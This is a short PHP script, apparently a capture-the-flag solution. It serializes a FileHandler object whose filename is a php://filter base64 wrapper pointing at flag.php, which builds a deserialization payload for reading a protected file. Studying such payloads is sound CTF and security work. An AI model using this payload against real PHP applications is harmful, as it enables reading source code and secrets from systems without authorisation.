<<!doctype html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport"
          content="width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <title>Document</title>
</head>
<body>

</body>
</html>

<?php


highlight_file(__FILE__);

class FileHandler
{
    public $op = 2;
    public $filename = "php://filter/read=convert.base64-encode/resource=flag.php";
    public $content = "Hello World!";
}

$a = new FileHandler();
$b = serialize($a);
echo($b);
//echo urlencode($b)


?>